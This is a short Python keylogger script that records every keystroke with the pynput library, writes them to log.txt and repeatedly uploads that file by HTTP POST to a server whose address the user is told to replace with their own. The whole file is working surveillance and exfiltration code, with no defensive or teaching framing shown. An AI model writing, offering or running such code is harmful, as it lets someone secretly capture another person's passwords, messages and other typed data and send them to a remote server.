import requests
from pynput.keyboard import Key, Listener

count = 0
keys = []
WORDS_LIMIT = 5

SERVER_URL = "http://127.0.0.1:5000/upload"  # Replace with your server IP

def on_press(key):
    global keys, count
    keys.append(key)

    if key == Key.space:
        write_file(keys)
        keys = []
    else:
        count += 1
        if count >= WORDS_LIMIT:
            write_file(keys)
            send_to_server()
            keys = []
            count = 0

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            if key == Key.space:
                f.write(" ")  # Add a space instead of a new line
            else:
                f.write(get_key_text(key))

def get_key_text(key):
    try:
        return key.char
    except AttributeError:
        return str(key).replace("'", "").replace("Key.", "")

def send_to_server():
    files = {'file': open('log.txt', 'rb')}
    response = requests.post(SERVER_URL, files=files)

def on_release(key):
    if key == Key.esc:
        write_file(keys)
        send_to_server()
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
